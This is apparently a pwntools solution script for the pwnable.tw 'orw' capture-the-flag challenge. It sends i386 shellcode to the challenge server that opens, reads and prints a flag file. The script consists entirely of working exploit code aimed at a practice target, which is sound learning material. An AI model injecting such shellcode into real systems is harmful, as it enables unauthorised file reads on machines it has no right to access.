from pwn import *
context(arch='i386', os='linux', endian='little')

addr = "chall.pwnable.tw"
port = 10001

s = remote(addr, port)

shellcode = asm(shellcraft.i386.linux.open('/home/orw/flag'))
shellcode += asm(shellcraft.i386.linux.read('eax', 'esp', 100))
shellcode += asm(shellcraft.i386.linux.write(1, 'esp', 100))

s.send(shellcode)

s.interactive()
s.close()
